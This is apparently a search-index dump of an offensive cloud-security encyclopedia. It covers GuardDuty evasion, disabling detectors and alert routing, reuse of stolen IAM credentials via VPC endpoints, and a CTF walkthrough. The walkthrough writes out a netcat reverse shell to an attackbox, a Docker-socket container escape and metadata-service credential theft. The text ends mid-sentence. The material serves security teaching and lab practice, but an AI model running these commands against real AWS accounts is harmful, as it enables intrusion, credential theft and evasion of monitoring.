{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"<p>Hacking the cloud is an encyclopedia of the attacks/tactics/techniques that offensive security professionals can use on their next cloud exploitation adventure. The goal is to share this knowledge with the security community to better defend cloud native technologies.</p> <p>All content on this site is created by volunteers. If you'd like to be one of them, you can contribute your knowledge by submitting a Pull Request. We are open to content from any major cloud provider and will also accept cloud-related technologies as well (Docker, Terraform, K8s, etc.). Additionally you are encouraged to update/modify/improve existing pages as well.</p> <p>Topics can include offensive techniques, tools, general knowledge related to cloud security, etc. Defensive knowledge is also welcome! At the end of the day the primary goal is to make the cloud safer, and defenders are welcome to submit content all the same.</p> <p>Don't worry about submitting content in the wrong format or what section it should be a part of, we can always make improvements later :) When writing content about a technique identified by a researcher, credit the researcher who discovered it and link to their site/talk.</p>"},{"location":"#contributing","title":"Contributing","text":"<p>If you'd like to contribute to the site, please see our contributing page. Anything helps! An article, a paragraph, or even a fix for a grammar mistake.</p> <p>Please checkout the GitHub page for more!</p>"},{"location":"#disclaimer","title":"Disclaimer","text":"<p>The information provided by Hacking the Cloud is intended to be used by professionals who are authorized to perform security assessments or by those defending cloud environments. While these techniques can be used to avoid detection, escalate privileges, compromise resources, etc. the intent is to improve security by making the knowledge of these techniques more generally available.</p>"},{"location":"aws/avoiding-detection/guardduty-pentest/","title":"Bypass GuardDuty Pentest Findings for the AWS CLI","text":"<p>Thank You</p> <p>Thank you to @yobroda for notifying me that the previous method in this article was outdated and suggesting a more reliable, long-term solution.</p> <p>As a cloud Penetration Tester or Red Teamer, we need to be aware of what artifacts we leave behind in the logs that we touch. One easy to overlook clue is the User-Agent value passed in AWS API requests. When using the AWS CLI or SDK to interact with AWS services, the User-Agent string is passed in the headers of the HTTP request. This string can be used to identify the tool or library making the request.</p> <p>This can give away the operating system you are using and may raises suspicion from defenders. For example, say you steal credentials from a developer workstation running MacOS and suddenly start making requests from a Windows machine. This suspicious activity could be noticed by automation and an alarm could be raised.</p> <p>This is where AWS GuardDuty comes in. GuardDuty is a threat detection service that continuously monitors for malicious activity and unauthorized behavior to protect your AWS accounts and workloads. GuardDuty takes this idea a step further and has built-in detections for common penetration testing Linux distributions like Kali Linux, ParrotOS, and Pentoo Linux. If you make AWS API requests from one of these distributions, GuardDuty will trigger a PenTest Finding.</p> <p>As you can imagine, this is not ideal. The good news is that the User-Agent string is entirely within our control. While this value is unfortunately something we cannot natively configure with the AWS CLI, we can use external tooling to intercept our requests and modify them. In this article, we will explain how we can modify our User-Agent string when using the AWS CLI to avoid triggering GuardDuty alerts.</p> <p>Note</p> <p>In the following example we will use Burp Suite because it is freely available and commonly used. If you have an alternative suggestion, please open a pull request to add it.</p>"},{"location":"aws/avoiding-detection/guardduty-pentest/#burp-suite-setup-and-usage","title":"Burp Suite Setup and Usage","text":"<p>To begin, download and install Burp Suite Community Edition. With it running, navigate to the Proxy tab and click <code>Proxy settings</code>.</p> <p>Next, scroll to <code>HTTP match and replace rules</code>:</p> <p></p> <p>From here, click <code>Add</code> and enter the following values:</p> <ul> <li>Type: <code>Request header</code></li> <li>Match: <code>^User-Agent.*$</code></li> <li>Regex match: Should be checked</li> <li>Replace: This can be any string of your choosing. Ensure you preprend <code>User-Agent:</code> to the beginning of the string. For a list of potential User-Agent values, you can refer to this list from Pacu.</li> </ul> <p>Click <code>Test</code> to see an example of what your change would look like.</p> <p></p> <p>To finish, click <code>OK</code>. To ensure your new rule is enabled, scroll to the bottom of your match and replace rules.</p> <p>Next, we need to configure our AWS CLI to use Burp Suite as a proxy. This can be done by setting the <code>HTTP_PROXY</code> and <code>HTTPS_PROXY</code> environment variables. For example:</p> <pre><code>export HTTPS_PROXY=http://127.0.0.1:8080\nexport HTTP_PROXY=http://127.0.0.1:8080\n</code></pre> <p>With this setup, all of your AWS CLI requests will be routed to Burp Suite, however you will likely encounter the following error:</p> <pre><code>SSL validation failed for https://sts.us-east-1.amazonaws.com/ [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1129)\n</code></pre> <p>This is because Burp Suite uses a self-signed certificate. There are multiple options to resolve this issue and I will defer to your professional discretion on which to use. You could, for example, add the self-signed certificate to your trusted certificates. Alternatively you could disable SSL verification with the AWS CLI using the <code>--no-verify-ssl</code> flag.</p> <p>Regardless of the method you choose, after making a request to the AWS API you should see the User-Agent string you configured appear in the associated CloudTrail logs.</p> <p></p> <p>With all of this in place, you can now make requests to the AWS API using the CLI without triggering GuardDuty alerts.</p>"},{"location":"aws/avoiding-detection/guardduty-tor-client/","title":"Bypass GuardDuty Tor Client Findings","text":"<p>UnauthorizedAccess:EC2/TorClient is a high severity GuardDuty finding that fires when an EC2 instance is detected making connections to Tor Guard or Authority nodes. According to the documentation, \"this finding may indicate unauthorized access to your AWS resources with the intent of hiding the attacker's true identity\".</p> <p>AWS determines this by comparing connections to the public list of Tor nodes. To those familiar with the Tor project, this is a common problem. Countries, internet service providers, and other authorities may block access to the Tor network making it difficult for citizens to access the open internet.</p> <p>From a technical perspective the Tor Project has largely gotten around this by using Bridges. Bridges are special nodes that do not disclose themselves like other Tor nodes do. Individuals who would normally have difficulty connecting directly to Tor can instead route their traffic through Bridge nodes. Similarly, we can bypass the Tor Client GuardDuty finding by using bridges.</p> <p>To do so, download the Tor and obfs4proxy binaries (the simplest way to do this on a Debian based system is <code>apt install tor obfs4proxy</code> and move them to your target). Obfs4 is a Pluggable Transport which modifies Tor traffic to communicate with a bridge. Navigate to bridges.torproject.org to get a bridge address. </p> <p>From here, create a torrc file with the following contents (being sure to fill in the information you got for the bridge address):</p> <pre><code>UseBridges 1\nBridge obfs4 *ip address*:*port* *fingerprint* cert=*cert string* iat-mode=0\nClientTransportPlugin obfs4 exec /bin/obfs4proxy\n</code></pre> <p>You will now be able to connect to the Tor network with <code>tor -f torrc</code> and you can connect to the Socks5 proxy on port 9050 (by default).</p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/","title":"Modify GuardDuty Configuration","text":"<p>When an account has been successfully compromised, an attacker can modify threat detection services like GuardDuty to reduce the likelihood of their actions triggering an alert. Modifying, as opposed to outright deleting, key attributes of GuardDuty may be less likely to raise alerts, and result in a similar degradation of effectiveness.  The actions available to an attacker will largely depend on the compromised permissions available to the attacker, the GuardDuty architecture and the presence of higher level controls like Service Control Policies. </p> <p>Where GuardDuty uses a delegated admin or invite model, features like detector configurations and IP Trust lists are centrally managed, and so they can only be modified in the GuardDuty administrator account. Where this is not the case, these features can be modified in the account that GuardDuty is running in.</p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/#misconfiguring-the-detector","title":"Misconfiguring the Detector","text":"<p>An attacker could modify an existing GuardDuty detector in the account, to remove log sources or lessen its effectiveness.</p> <ul> <li> <p> Required IAM Permissions</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:UpdateDetector</li> </ul> </li> </ul> <p>Configuration changes may include a combination of:</p> <ul> <li>Disabling the detector altogether.  </li> <li>Removing Kubernetes and s3 as data sources, which removes all S3 Protection and Kubernetes alerts.  </li> <li>Increasing the event update frequency to 6 hours, as opposed to as low as 15 minutes.</li> </ul> <p>Example CLI commands <pre><code># Disabling the detector\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --no-enable \n\n# Removing s3 as a log source\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --data-sources S3Logs={Enable=false}\n\n# Increase finding update time to 6 hours\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --finding-publishing-frequency SIX_HOURS\n</code></pre></p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/#modifying-trusted-ip-lists","title":"Modifying Trusted IP Lists","text":"<p>An attacker could create or update GuardDuty's Trusted IP list, including their own IP on the list.  Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them. </p> <p>DNS findings are exempt from the Trusted IP list.</p> <ul> <li> <p> Required IAM Permissions</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:ListIPSets</li> <li>guardduty:CreateIPSet</li> <li>guardduty:UpdateIPSet</li> <li>iam:PutRolePolicy</li> </ul> </li> </ul> <p>Depending on the level of stealth required, the file can be uploaded to an s3 bucket in the target account, or an account controlled by the attacker.</p> <p>Example CLI commands <pre><code>aws guardduty update-ip-set \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --ip-set-id 24adjigdk34290840348exampleiplist \\\n    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \\\n    --activate\n</code></pre></p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/#modify-cloudwatch-events-rule","title":"Modify Cloudwatch events rule","text":"<p>GuardDuty populates its findings to Cloudwatch Events on a 5 minute cadence.  Modifying the Event pattern or Targets for an event may reduce GuardDuty's ability to alert and trigger auto-remediation of findings, especially where the remediation is triggered in a member account as GuardDuty administrator protections do not extend to the Cloudwatch events in the member account. </p> <ul> <li> <p> Required IAM Permissions</p> <ul> <li>events:ListRules</li> <li>events:ListTargetsByRule</li> <li>events:PutRule</li> <li>events:RemoveTargets</li> </ul> </li> </ul> <p>Note</p> <p>In a delegated or invitational admin GuardDuty architecture, cloudwatch events will still be created in the admin account.</p> <p>Example CLI commands <pre><code># Disable GuardDuty Cloudwatch Event\naws events put-rule --name guardduty-event \\\n--event-pattern \"{\\\"source\\\":[\\\"aws.guardduty\\\"]}\" \\\n--state DISABLED\n\n# Modify Event Pattern\naws events put-rule --name guardduty-event \\\n--event-pattern '{\"source\": [\"aws.somethingthatdoesntexist\"]}'\n\n# Remove Event Targets\naws events remove-targets --name guardduty-event \\\n--ids \"GuardDutyTarget\"\n</code></pre></p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/#supression-rules","title":"Supression Rules","text":"<p>Newly create GuardDuty findings can be automatically archived via Suppression Rules. An adversary could use filters to automatically archive findings they are likely to generate. </p> <ul> <li> <p> Required IAM Permissions</p> <ul> <li>guardduty:CreateFilter</li> </ul> </li> </ul> <p>Example CLI commands</p> <pre><code>aws  guardduty create-filter --action ARCHIVE --detector-id 12abc34d567e8fa901bc2d34e56789f0 --name yourfiltername --finding-criteria file://criteria.json\n</code></pre> <p>Filters can be created using the CreateFilter API.</p>"},{"location":"aws/avoiding-detection/modify-guardduty-config/#delete-publishing-destination","title":"Delete Publishing Destination","text":"<p>An adversary could disable alerting simply by deleting the destination of alerts.</p> <ul> <li> <p> Required IAM Permissions</p> <ul> <li>guardduty:DeletePublishingDestination</li> </ul> </li> </ul> <p>Example CLI commands</p> <pre><code>aws guardduty delete-publishing-destination --detector-id abc123 --destination-id def456\n</code></pre>"},{"location":"aws/avoiding-detection/steal-keys-undetected/","title":"Bypass Credential Exfiltration Detection","text":"<ul> <li> <p> Tools mentioned in this article</p> <p>SneakyEndpoints: Hide from the InstanceCredentialExfiltration GuardDuty finding by using VPC Endpoints </p> </li> </ul> <p>A common technique when exploiting AWS environments is leveraging SSRF, XXE, command injection, etc. to steal IAM credentials from the instance metadata service of a target EC2 instance. This can allow you to execute AWS API calls within the victim's account, however, it comes with a risk. If you were to try to use those credentials outside of that host (for example, from your laptop) an alert would be triggered. There is a GuardDuty finding which detects when IAM credentials are being used outside of EC2 called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.</p> <p>To get around this alert being triggered, attackers could use the stolen credentials from the attacker's EC2 instance. The alert only detected if the credentials were used outside of EC2, not the victim's specific EC2 instance. So by using their own, or exploiting another EC2 instance, attackers could bypass the GuardDuty alert.</p> <p>On January 20th 2022, AWS released a new GuardDuty finding called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS. This new finding addressed the shortcomings of the previous one. Now, when IAM credentials are used from ANY EC2 instance, if those credentials don't belong to the same account as the EC2 instance which generated them, it triggers the alert. Thus, simply using your own EC2 instance is no longer viable. This addresses a long standing concern within the cloud security community.</p> <p>However, there is currently a functioning bypass for this - VPC Endpoints. Using VPC Endpoints will not trigger the GuardDuty alert. What this means is that, as an attacker, <code>if you steal IAM credentials from an EC2 instance, you can use those credentials from your own EC2 instance while routing traffic through VPC Endpoints. This will not trigger the GuardDuty finding</code>.</p> <p>Note that, starting in October 2024, GuardDuty began detecting these bypass attempts for services that support CloudTrail network activity events for VPC endpoints. Initially, this applied only to EC2, KMS, Secrets Manager, and CloudTrail, but by mid-2025, it had expanded to 26 services. This means the technique may no longer be reliable depending on the target service \u2014 always test current behavior and consult the latest AWS documentation to verify which services will trigger the alert.</p> <p>Note</p> <p>There is another bypass option, however, it would only be useful in niche scenarios. The InstanceCredentialExfiltration finding is only tied to the AWS account, not the EC2 instance. As a result, if you compromise an EC2 instance in the target account and then compromise OTHER EC2 instances in the account, or steal their IAM credentials, you can safely use them from the initially compromised instance without fear of triggering GuardDuty.</p>"},{"location":"aws/avoiding-detection/steal-keys-undetected/#sneakyendpoints","title":"SneakyEndpoints","text":"<p>To make this setup faster/easier for Penetration Testers and Red Teamers, SneakyEndpoints was created. This project is a collection of Terraform configurations which can quickly spin up an environment to attack form. It will create an EC2 instance in a private subnet (no internet access) and create a number of VPC Endpoints for you to use. This setup ensures we don't accidentally access an internet facing API endpoint and trigger the alert.</p>"},{"location":"aws/avoiding-detection/steal-keys-undetected/#setup-and-usage","title":"Setup and Usage","text":"<p>To use SneakyEndpoints first install Terraform and set AWS credentials within your shell session. </p> <p>Next, perform the following Terraform commands:</p> <pre><code>terraform init\nterraform apply\n</code></pre> <p>Before continuing Terraform will ask you to confirm the deployment. After that, way ~10 minutes for everything to be done. Please note that after the deployment is finished it may take a short period of time for the EC2 instance to be connectable.</p> <p>After this period of time, connect to the EC2 instance using the AWS Systems Manager Session Manager.</p> <p>To teardown the infrastructure, run the following command:</p> <pre><code>terraform destroy\n</code></pre>"},{"location":"aws/avoiding-detection/steal-keys-undetected/#using-sts","title":"Using STS","text":"<p>Due to a quirk in how STS is setup, you will have to set a specific environment variable with the following command.</p> <pre><code>export AWS_STS_REGIONAL_ENDPOINTS=regional\n</code></pre> <p>This is because some versions of the AWS SDK default to using the global STS endpoint at <code>sts.amazonaws.com</code>. This is problematic because VPC endpoints are regional (e.g. <code>sts.us-east-1.amazonaws.com</code>). The result is that if you use a version that is expecting the global endpoint with SneakyEndpoints, the connection will timeout.</p>"},{"location":"aws/capture_the_flag/cicdont/","title":"CI/CDon't","text":"<p>Link to Project: CI/CDon't</p> <p>Note</p> <p>This project will deploy intentionally vulnerable software/infrastructure to your AWS account. Please ensure there is no sensitive or irrecoverable data in the account. Attempts have been made to mitigate this however they may not be fullproof; Security Group rules only allow access to the vulnerable EC2 instance from your public IP address, and a randomly generated password is required to access it.</p> <p>Warning</p> <p>If you intend to play the CTF it is a good idea to read through this page carefully to ensure you have all the details (minus the walkthrough). This page will familiarize the player with how the CTF works, what the objective is, and what the storyline is.</p>"},{"location":"aws/capture_the_flag/cicdont/#background","title":"Background","text":"<p>This is an AWS/GitLab CI/CD themed CTF that you can run in your own AWS account. All that is required is an AWS account and Terraform installed locally on your machine.</p> <p>Costs should be minimal; running this infrastructure in my own account for three hours didn't accrue a cent in the Billing Dashboard, however extended time frames may cause costs to add up.</p> <p>In terms of difficulty, it would be rated low. The goal is more about having fun and working through some simple CI/CD/AWS challenges that even non-security folks would enjoy.</p>"},{"location":"aws/capture_the_flag/cicdont/#how-to-play","title":"How to Play","text":"<p>Clone this repository and navigate to the cicdont directory.</p> <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre> <p>To deploy the CTF environment run the Terraform init/apply command.</p> <pre><code>terraform init\nterraform apply\n</code></pre> <p>You will be prompted with two questions. The first is a consent related to the costs of the CTF (Again, these should be minimal however the environment should still be taken down when you're finished with it). The second is asking your player name. Please do not use special characters in the name, only upper and lower case letters. This will be used in the game.</p> <p>Note</p> <p>It will take approximately 10 minutes for all the infrastructure to be deployed and ready. This 10 minute timer begins AFTER the Terraform apply has completed. This time is used to install all the software, create the NPCs, etc.</p> <p>Warning</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create a security group that only that IP address can access. If you cannot access the target_ip (explained below) after 10 minutes, check the AWS console for a security group named <code>allow_http</code> and ensure that its configuration would allow you to reach it.</p> <p>To destroy the CTF environment run the Terraform destroy command.</p> <pre><code>terraform destroy\n</code></pre> <p>This will again prompt you for the two questions. Please answer them and the infrastructure will be destroyed.</p>"},{"location":"aws/capture_the_flag/cicdont/#the-important-bits","title":"The Important Bits","text":"<p>Once you've run terraform apply, you will receive 5 outputs. This will include the following:</p> <ul> <li>Player Username</li> <li>Player Password (randomly generated)</li> <li>Attackbox IP</li> <li>Target IP</li> <li>Time warning</li> </ul> <p>The attackbox is an EC2 instance you can use for whatever purposes you deem fit. In particular you can use it to catch a reverse shell, or load your C2 platform of choice on it (you have sudo access via the password).</p> <p>To access the attackbox, you can ssh using your player username and password.</p> <pre><code>ssh &lt;player username&gt;@&lt;attackbox IP&gt;\n</code></pre> <p>Note</p> <p>When sshing with a player username, note that the username is case-sensitive.</p> <p>It will take approximately 10 minutes for all the infrastructure to finish deploying. If you'd like to test if it's finished, you can navigate to <code>http://&lt;target IP&gt;/</code>. If it doesn't respond, or only shows a generic GitLab login page, then the CTF is not ready yet. If you see a message about SoftHouseIO, then everything is setup and ready.</p> <p>Note</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create security group rules that only that IP address can access. If you cannot access the target instance after 10 minutes (likely shorter), check the AWS console for a security group named <code>allow_http</code> and ensure that it's configuration would allow you to reach it.</p> <p>These security group rules apply to both the target (GitLab) and the attackbox. Additionally, the rules are configured to allow the attackbox to receive incoming traffic from the target (to catch shells).</p> <p>If you see any references to <code>gamemaster</code>, please ignore it. Those scripts are used to simulate the NPCs and have them complete their lore tasks. It is unrelated to the challenge.</p>"},{"location":"aws/capture_the_flag/cicdont/#the-story","title":"The Story","text":"<p>You are &lt;player username&gt;, a developer at SoftHouseIO, an independent software development consultancy firm. While you like the company, you're thinking about making a little money on the side, perhaps through not entirely legal means. Can you say ransomware?</p> <p>After planning your attack you figure the best place to get started is the company GitLab server at http://&lt;target IP&gt;. Your username and password should you get you in. You'll want to gain access to administrative credentials for the AWS account the company uses.</p>"},{"location":"aws/capture_the_flag/cicdont/#the-objective","title":"The Objective","text":"<p>Gain access to the <code>aws_admin_automation_user</code> through whatever means necessary (Note that this role has no permissions. It is simply the goal).</p>"},{"location":"aws/capture_the_flag/cicdont/#feedback","title":"Feedback","text":"<p>Want to provide feedback on the challenge? Open a new discussion on GitHub</p>"},{"location":"aws/capture_the_flag/cicdont/#walkthrough","title":"Walkthrough","text":"<p>The following is a step by step walkthrough of the CTF. You can refer to this if you get stuck or simply just want to know what is next. Click the summary below to expand it.</p> Summary <p>Consent and Name</p> <p>To begin the CTF we must first stand up all the infrastructure. We do this using Terraform.</p> <p>Download the challenge using git. <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre></p> <p>Initialize the project. <pre><code>terraform init\n</code></pre></p> <p>Create the infrastructure. <pre><code>terraform apply\n</code></pre></p> <p>We will be prompted first with a consent. Read through the question and answer with yes or no.</p> <p>After this, it will ask for a player name. Please only use lower and uppercase letters. No special characters or numbers.</p> <p></p> <p>After this, you will be asked if you'd like to perform the deployment. Answer with \"yes\".</p> <p>The Terraform deployment will begin.</p> <p>Wait</p> <p>Note</p> <p>You will now need to wait 10 minutes for the deployment to finish. The 10 minute timer starts AFTER you get the \"Apply complete\" notification.</p> <p></p> <p>Does it really take 10 minutes? Yes, it takes a little bit to get everything setup. You can take this time to get familiar with your attackbox. This is an EC2 instance you can use for whatever you need during the CTF, particularly to catch shells.</p> <p>You can ssh into the box using your username and password</p> <pre><code>ssh &lt;player_username&gt;@&lt;target_ip&gt;\n</code></pre> <p>Note</p> <p>The username is case-sensitive.</p> <p>Getting Started</p> <p>After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.</p> <p></p> <p>From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.</p> <p></p> <p>Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.</p> <p>Navigate to the mvp-docker project's Issues page.</p> <p></p> <p>This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a gitlab-ci.yml file, which is the configuration for the GitLab CI/CD pipeline.</p> <p>Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.</p> <p>Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).</p> <p></p> <p>After committing changes (via the web interface or otherwise) you can navigate to the <code>CI/CD</code> tab on the left to see the pipeline execute.</p> <p>Clicking on the status, and then the build job we can see the output.</p> <p></p> <p>This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the \"docker\" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.</p> <p>This looks like a fantastic place to start.</p> <p>Getting a Reverse Shell</p> <p>Our next step will be to get a shell in this environment. This is where our attackbox can come in.</p> <p>Please note: You are welcome to use your C2 platform of choice (If you'd like a recommendation, I'm a fan of Mythic). For this walkthrough I will use netcat for simplicity.</p> <p>SSH into your attack box and install a tool called <code>ncat</code>.</p> <p></p> <p>Now, we can setup a listener (from the attackbox) with the following command.</p> <pre><code>sudo ncat -l 443 --ssl -v\n</code></pre> <p>We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the apt package manager.</p> <pre><code>apt update\napt install -y ncat\nncat &lt;attackbox_ip&gt; 443 --ssl -e /bin/bash -v\n</code></pre> <p></p> <p>Now click \"Commit changes\" and watch that pipeline run.</p> <p>You are now the proud owner of a reverse shell inside this Docker container.</p> <p></p> <p>Docker Socket</p> <p>From here, there are a number of things we could try to do. Your first instinct may be, \"I'm on an EC2 instance, can I reach the metadata service?\". That's a great idea! Unfortunately you can't.</p> <p>The bright folks over at SoftHouseIO use IMDSv2, one of the benefits of which is that Docker containers cannot reach it by default.</p> <pre><code>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.\n</code></pre> <p>That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?</p> <p>That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like kaniko? What if they just exposed the Docker socket instead?</p> <p>When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.</p> <p>The common location for the socket is at <code>/var/run/docker.sock</code>, let's go look for it.</p> <p></p> <p>There we go! They did mount the Docker socket! Let's use this to escape the container.</p> <p>Escaping the Container</p> <p>Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.</p> <p>First let's install two tools that will make things easier for ourselves.</p> <pre><code>apt update\napt install -y python3 docker.io\n</code></pre> <p>Python3 will help us to spawn a <code>tty</code> and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.</p> <p>With those two tools installed, let's spawn a <code>tty</code> with the classic Python one-liner.</p> <pre><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p></p> <p>Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.</p> <pre><code>docker ps\n</code></pre> <p>This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a number of options to do this).</p> <pre><code>docker run -it --rm --pid=host --privileged ubuntu bash\n</code></pre> <p>Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.</p> <pre><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n</code></pre> <p></p> <p>How fun is that?! We now have root on the underlying host and have escaped the container.</p> <p>Escalating</p> <p>With root on the host, we have a number of options for next steps. We can steal IAM credentials from the metadata service, brute force our IAM permissions, enumerate roles in the account to find out what services are running in the account, attempt to escalate IAM privileges, maybe try to intercept the SSM agent if it's running on the box? One place we should check before doing all that is the user data.</p> <p>User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.</p> <p>Let's check this (remember we are using IMDSv2).</p> <pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre> <p></p> <p>On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.</p> <p>There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user of GitLab.</p> <p>This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: &lt;what's in the useradata&gt;)</p> <p>After exploring around for a little while, you may stumble into the the <code>infra-deployer</code> project. That sounds important.</p> <p></p> <p>\"Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners\". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the <code>Settings</code> tab on the left and then click <code>CI/CD</code>. Next, click <code>Expand</code> on the <code>Variables</code> section.</p> <p></p> <p>An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this without logging to CloudTrail if you were so inclined).</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIA....\nexport AWS_SECRET_ACCESS_KEY=....\naws sts get-caller-identity\n</code></pre> <p></p> <p>And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on GitHub.</p>"},{"location":"aws/capture_the_flag/cicdont/#acknowledgements","title":"Acknowledgements","text":"<p>These wonderful folks helped beta-test this CTF and provided feedback.</p> <p>Christophe Tafani-Dereeper Jake Berkowsky Kaushik Pal</p>"},{"location":"aws/deprecated/stealth_perm_enum/","title":"[Deprecated] Enumerate Permissions without Logging to CloudTrail","text":"<ul> <li> <p> Original Research</p> <p> <p>Enumerate AWS API Permissions Without Logging to CloudTrail by Nick Frichette</p> <p></p> </p> </li> <li> <p> Tools mentioned in this article</p> <p>aws_stealth_perm_enum</p> </li> </ul> <p>Warning</p> <p>As of 5/18/2021, this technique has been resolved and fixed by AWS. Mutating the Content-Type header when making API requests no longer can be used to enumerate permissions of a role or user. This page is maintained for historical and inspiration purposes.</p> <p>After compromising an IAM credential while attacking AWS, your next task will be to determine what permissions that credential has scoped to them.</p> <p>Aside from guessing, enumerating these permissions would typically require a tool to brute force them like enumerate-iam (which is a fantastic tool). The problem of course is that this will generate a ton of CloudTrail logs and will alert any defender. This poses a challenge to us, how can we enumerate permissions in a stealthy manner?  </p> <p>The good news is that there is a bug in the AWS API that affects 589 actions across 39 different AWS services. This bug is a result of a mishandling of the Content-Type header, and when that header is malformed in a specific way the results are not logged to CloudTrail. Based on the response codes/body we can determine if the role does or does not have permission to make that API call.</p> <p>The following services are affected, although please note, that not all actions for these services can be enumerated.  </p> application-autoscaling appstream athena autoscaling-plans aws-marketplace cloudhsm codecommit codepipeline codestar comprehend cur datapipeline dax discovery forecast gamelift health identitystore kinesis kinesisanalytics macie mediastore mgh mturk-requester opsworks-cm personalize redshift-data route53domains route53resolver sagemaker secretsmanager shield sms snowball support tagging textract translate workmail <p>Note</p> <p>For an in depth explanation for the bug, please see the original research. In this article we will just discuss how to take advantage of it.</p> <p>There are some conditions to the enumeration, and they are defined below.</p> <p>1 - The AWS service uses the JSON 1.1 protocol. 2 - The API actions returns a unique error code depending on the permission set. 3 - The resource associated with that action is set to \"*\".</p> <p>To perform the enumeration there is a script here. Setting the credentials as environment variables and then running the script will inform you what API permissions you have available to you.</p> <p></p>"},{"location":"aws/deprecated/whoami/","title":"[Deprecated] Whoami - Get Principal Name From Keys","text":""},{"location":"aws/deprecated/whoami/#sns-publish","title":"sns publish","text":"<p>Warning</p> <p>As of Q4 2023 these calls can optionally be tracked in CloudTrail by enabling dataplane logging. While this will not be enabled for the overwhelming majority of AWS accounts, there is no reason to risk it when there are other methods available.</p> <p>sns:Publish would return the ARN of the calling user/role without logging to CloudTrail. To use this method, you had to provide a valid AWS account ID in the API call. This could be your own account id, or the account id of anyone else.</p> <pre><code>user@host:~$ aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa\n\nAn error occurred (AuthorizationError) when calling the Publish operation: User: arn:aws:iam::123456789123:user/no-perm is not authorized to perform: SNS:Publish on resource: arn:aws:sns:us-east-1:*account id*:aaa because no resource-based policy allows the SNS:Publish action\n</code></pre>"},{"location":"aws/deprecated/whoami/#sdb-list-domains","title":"sdb list-domains","text":"<p>Warning</p> <p>As of August 15, 2020 these calls are now tracked in CloudTrail (tweet). This page is maintained for historical and inspiration purposes.</p> <p>As found by Spencer Gietzen, the API call for sdb list-domains will return very similar information to get-caller-identity.</p> <pre><code>user@host:$ aws sdb list-domains --region us-east-1\n\nAn error occurred (AuthorizationFailure) when calling the ListDomains operation: User (arn:aws:sts::123456789012:assumed-role/example_role/i-00000000000000000) does not have permission to perform 